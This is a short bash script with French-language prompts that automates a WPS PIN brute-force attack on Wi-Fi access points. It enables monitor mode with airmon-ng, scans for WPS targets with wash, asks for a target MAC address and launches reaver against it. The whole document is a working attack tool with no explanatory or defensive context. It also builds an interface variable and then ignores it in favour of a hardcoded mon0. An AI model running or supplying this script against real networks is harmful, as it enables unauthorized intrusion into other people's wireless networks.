airmon-ng start wlan0
read -p "Entrez votre interface : " inter
m=mon
var=$inter$m
wash -i $var -c 1
read -p "Entrez l'@mac : " mac
reaver -i mon0 -b $mac -p "" -c 1 -vv
